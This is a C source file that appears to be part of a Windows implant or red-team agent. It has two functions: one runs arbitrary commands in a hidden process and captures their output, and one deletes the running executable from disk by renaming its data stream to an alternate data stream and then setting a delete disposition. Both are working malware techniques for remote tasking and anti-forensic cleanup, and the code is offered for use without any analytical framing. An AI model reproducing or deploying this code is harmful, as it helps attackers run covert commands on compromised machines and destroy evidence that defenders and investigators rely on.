
#include "Support/String.h"
#include "Macro/Macro.h"
#include "Debug.h"
#include "Support/Memory.h"
#include "Core/Tasks/Modules/Execution.h"
#include <windows.h>


int ExecuteCommand(const char* Command, int* TSize, char** Result){

    unsigned char* strResult = 0;
    BOOL bProcessEnded = FALSE;
    int checksize = 0;
    int size = NULL;
    int tmpMemSize=8192;
    unsigned char* tmp = HMalloc(tmpMemSize);
    char* app = NULL;
    char* cmd = NULL;
    BOOL fSuccess = NULL;
    HANDLE hPipeRead, hPipeWrite = NULL;
    BOOL ReturnV = FALSE;
    SECURITY_ATTRIBUTES saAttr = { 0 };
    saAttr.bInheritHandle = TRUE; // Pipe handles are inherited by child process.
    saAttr.lpSecurityDescriptor = NULL;
    int appsize=0;
    // Create a pipe to get results from child's stdout.
    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0))
    {
        RED_DPRINT("Fail To CreatePipe\n");
        goto Clean;
    }
    STARTUPINFOW si = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.hStdOutput = hPipeWrite;
    si.hStdError = hPipeWrite;
    si.wShowWindow = SW_HIDE; // Prevents cmd window from flashing.
    PROCESS_INFORMATION pi = { 0 };
    const char* firstSpace = strchr(Command, ' ');
    if (firstSpace != NULL)
    {
        app = strndup(Command, firstSpace - Command, &appsize);
        cmd = strdup(firstSpace + 1);
        RED_DPRINT("Execute [%s] Args [%s]\n", app, cmd);
        fSuccess = CreateProcessA(app, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

        
    }else {
        RED_DPRINT("Execute [%s] with No Command Line Args Avalible\n", Command);

        fSuccess = CreateProcessA(Command, NULL, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }
    // Extract application and command line

        


    if (!fSuccess)
    {
        RED_DPRINT("Fail To CreateProcessA\n");
        goto Clean;
    }


    DWORD timeout = GetTickCount() + (5 * 1000);
    for (; !bProcessEnded;)
    {
        // Give some timeslice (50 ms), so we won't waste 100% CPU.
        bProcessEnded = WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0;
        // Even if process exited - we continue reading, if
        // there is some data available over pipe.

        while (1)
        {

            DWORD dwRead = 0;
            DWORD dwAvail = 0;

            if (!PeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail,
                NULL))
            {
                RED_DPRINT("PeekNamedPipe Error\n");
                break;
            }
            if (GetTickCount() > timeout && dwAvail == 0)
            {
                TerminateProcess(pi.hProcess, 1);
                RED_DPRINT("timeout occurs\n");
                goto Clean;
                break;
            }
            if (!dwAvail)
            {
                DPRINT("No Output available\n"); // No data available, return
                break;
            }
            if (!ReadFile(hPipeRead, tmp, tmpMemSize, &dwRead, NULL) ||
                !dwRead)
            {
                //Error, the child process might ended
                RED_DPRINT("Error, the child process might ended\n");
                break;
            }
            
            strResult = HRealloc(strResult, checksize+ dwRead,checksize);
            checksize = checksize + dwRead;
            Memcpy(strResult + size, tmp, dwRead);
            size = size + dwRead;
            Memset(tmp, 0, tmpMemSize);
            dwRead = 0;
            dwAvail = 0;
        }
    }

    if (strResult != 0 && size>0)
    {
        *Result = strResult;
        *TSize = size;
        ReturnV = TRUE;
    }
    else
    {
        *Result=NULL;
        *TSize =0;
        RED_DPRINT("Error, NO Result\n");

    }
    DPRINT("Out ExecCmd\n");

Clean:

    if (hPipeWrite != NULL) {
        CloseHandle(hPipeWrite);
    }
    if (hPipeRead != NULL) {
        CloseHandle(hPipeRead);
    }
    if (pi.hProcess != NULL) {
        CloseHandle(pi.hProcess);
    }
    if (pi.hThread != NULL) {
        CloseHandle(pi.hThread);
    }
    HFree(tmp,tmpMemSize);
    HFree(app,appsize);
    return ReturnV;
}



HANDLE ds_open_handle(
	PWCHAR pwPath
)
{
	return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
}


BOOL ds_rename_handle(
	HANDLE hHandle
)
{
	FILE_RENAME_INFO fRename;
	RtlSecureZeroMemory(&fRename, sizeof(fRename));

	// set our FileNameLength and FileName to DS_STREAM_RENAME
	LPWSTR lpwStream = DS_STREAM_RENAME;
	fRename.FileNameLength = sizeof(lpwStream);
	RtlCopyMemory(fRename.FileName, lpwStream, sizeof(lpwStream));

	return SetFileInformationByHandle(hHandle, FileRenameInfo, &fRename, sizeof(fRename) + sizeof(lpwStream));
}

BOOL ds_deposite_handle(
	HANDLE hHandle
)
{
	// set FILE_DISPOSITION_INFO::DeleteFile to TRUE
	FILE_DISPOSITION_INFO fDelete;
	RtlSecureZeroMemory(&fDelete, sizeof(fDelete));

	fDelete.DeleteFile = TRUE;

	return SetFileInformationByHandle(hHandle, FileDispositionInfo, &fDelete, sizeof(fDelete));
}

BOOL SelfDelete()
{
	WCHAR wcPath[MAX_PATH + 1];
	RtlSecureZeroMemory(wcPath, sizeof(wcPath));

	// get the path to the current running process ctx
	if (GetModuleFileNameW(NULL, wcPath, MAX_PATH) == 0)
	{
		RED_DPRINT("failed to get the current module handle");
		return 0;
	}

	HANDLE hCurrent = ds_open_handle(wcPath);
	if (hCurrent == INVALID_HANDLE_VALUE)
	{
		RED_DPRINT("failed to acquire handle to current running process");
		return 0;
	}

	// rename the associated HANDLE's file name
	DPRINT("attempting to rename file name");
	if (!ds_rename_handle(hCurrent))
	{
		RED_DPRINT("failed to rename to stream");
		return 0;
	}

	DPRINT("successfully renamed file primary :$DATA ADS to specified stream, closing initial handle");
	CloseHandle(hCurrent);

	// open another handle, trigger deletion on close
	hCurrent = ds_open_handle(wcPath);
	if (hCurrent == INVALID_HANDLE_VALUE)
	{
		RED_DPRINT("failed to reopen current module");
		return 0;
	}

	if (!ds_deposite_handle(hCurrent))
	{
		RED_DPRINT("failed to set delete deposition");
		return 0;
	}

	// trigger the deletion deposition on hCurrent
	DPRINT("closing handle to trigger deletion deposition");
	CloseHandle(hCurrent);

	// verify we've been deleted
	if (PathFileExistsW(wcPath))
	{
		RED_DPRINT("failed to delete copy, file still exists");
		return 0;
	}

	GREEN_DPRINT("successfully deleted self from disk");
	return 1;
}










































